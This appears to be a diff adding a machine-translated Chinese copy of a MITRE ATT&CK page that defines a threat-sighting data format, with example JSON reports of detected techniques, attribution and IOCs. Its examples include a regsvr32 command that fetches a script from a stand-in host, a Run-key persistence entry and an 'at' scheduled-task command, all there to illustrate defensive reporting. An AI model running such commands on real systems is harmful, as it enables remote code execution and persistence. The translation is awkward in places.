+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始数据列表中的每个对象应由</font></font><a href="https://car.mitre.org/data_model/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CAR数据模型</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中的</font><font style="vertical-align: inherit;">对象组成，</font><font style="vertical-align: inherit;">形式为“object.action”：{“field”：“value”}。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如：</font></font></p>
+<p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></p>
+<div class="highlight"><pre><span></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“process.create”：{“command_line”：“regsvr32.exe /i:hxxp://lolbad.com scrobj.dll”}
+</font></font></pre></div>
+
+
+<p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表项</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></p>
+<div class="highlight"><pre><span></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“registry.add”：{</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    “hive”：“HKEY_CURRENT_USER”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    “key”：“\ Software \ Microsoft \ Windows \ CurrentVersion \ Run”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    “value”：“bad.exe”</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+}</font></font><font></font>
+</pre></div>
+
+
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更完整的例子也在下面。</font><font style="vertical-align: inherit;">如果CAR数据模型中没有任何东西可以表达，那么只需要化妆，对象和动作对你有意义，我们就会弄明白。
+</font></font><br /><br /></p>
+<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子</font></font></h2>
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简单的技术瞄准</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">托管服务提供商监控其客户群中的传感器数据。</font><font style="vertical-align: inherit;">在该监视期间，分析标记Sysmon进程事件，该事件指示正在使用“at”创建计划任务。</font></font></p>
+<div class="highlight"><pre><span></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “id”：“DT-1234”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “sightingType”：“直接技术瞄准”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “startTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “endTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “detectionType”：“人类验证”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “技术”：[</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    {</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “techniqueID”：“T1088”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “startTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “endTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “平台”：“Windows 10”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “原始数据”： [</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+        “process.create”：{“command_line”：“at 13:30 / interactive cmd”}</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      ]</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    }</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  ]</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+}</font></font><font></font>
+</pre></div>
+
+
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术瞄准与归因</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ISAC收集，匿名和重新分配其成员的目击。</font><font style="vertical-align: inherit;">虽然它没有收到原始数据，但确实有人口统计和（有时）归因信息。</font></font></p>
+<div class="highlight"><pre><span></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “id”：“1000”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “sightingType”：“直接技术瞄准”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “startTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “endTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “detectionType”：“人类验证”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “部门”：[“财务”]，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “attributionType”：“group”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “归属”：“FIN7”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “技术”：[</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    {</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “techniqueID”：“T1003”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “startTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “endTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+      “平台”：“Windows 10企业版”</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+    }</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  ]</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+}</font></font><font></font>
+</pre></div>
+
+
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全工具阻止恶意软件</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大型最终用户组织正在运行反恶意软件服务，该服务阻止已经在ATT和CK中执行Mac恶意软件。</font></font></p>
+<div class="highlight"><pre><span></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “id”：“32”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “sightingType”：“直接恶意软件瞄准”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “startTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “endTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “detectionType”：“raw”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “部门”：[“医疗保健”]，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “软件”：“MacSpy”</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+}</font></font><font></font>
+</pre></div>
+
+
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IOC提交</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TIP供应商提交了一组已使用ATT和CK技术识别的IOC。</font></font></p>
+<div class="highlight"><pre><span></span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “id”：“32”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “sightingType”：“间接恶意软件瞄准”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “startTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “endTime”：“2019-01-01T08：12：00Z”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “部门”：[“医疗保健”]，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “软件”：“RemCom”，</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+  “ioc”：“&lt;some hash&gt;”</font></font><font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+} </font></font><font></font>
+</pre></div>
+        </div>
+    </div>
+</div>
+</div>
+<!--stopindex-->
+<footer class="footer pt-3 pb-2">
+    <div class="container-fluid text-center">
+        <a class="btn btn-primary float-right mr-4" href="https://twitter.com/MITREattack" target="_blank" rel="noopener" aria-label="Twitter">
+            <img src="../theme/images/twitter.png" class="mx-auto d-block" width="28" height="28" /><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 跟着我们！</font></font></a>
+        <a href="https://www.mitre.org" target="_blank" rel="noopener" aria-label="MITRE" class="float-left ml-4">
+            <img src="../theme/images/mitrelogowhiteontrans.gif" width="144" height="66" /></a>
+        <br />
+        <p>
+            <br /><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有©2018，MITRE Corporation。</font><font style="vertical-align: inherit;">MITRE ATT＆CK和ATT＆CK是The MITRE Corporation的商标。</font></font></p>
+        <small><a href="privacy" class="footer-link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">隐私政策</font></font></a>  <a href="terms-of-use" class="footer-link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用条款</font></font></a></small>
+    </div>
+</footer>
+
+     <!--SCRIPTS-->
+    <script src="../theme/scripts/jquery-3.2.1.min.js"></script>
+    <script src="../theme/scripts/popper.min.js"></script>
+    <script src="../theme/scripts/bootstrap.min.js"></script>
+    <script src="../theme/scripts/site.js"></script>
+    <script src="../theme/scripts/lunr-2.3.3.js"></script>
+    <script src="../theme/scripts/search.js"></script>
+    <script src="../theme/scripts/index.js"></script>
+
+<script src="../theme/scripts/tables.js"></script>
+
+
+<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google 翻译" /></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;" /><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><!--startindex--><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"/></svg></div></div></body></html>
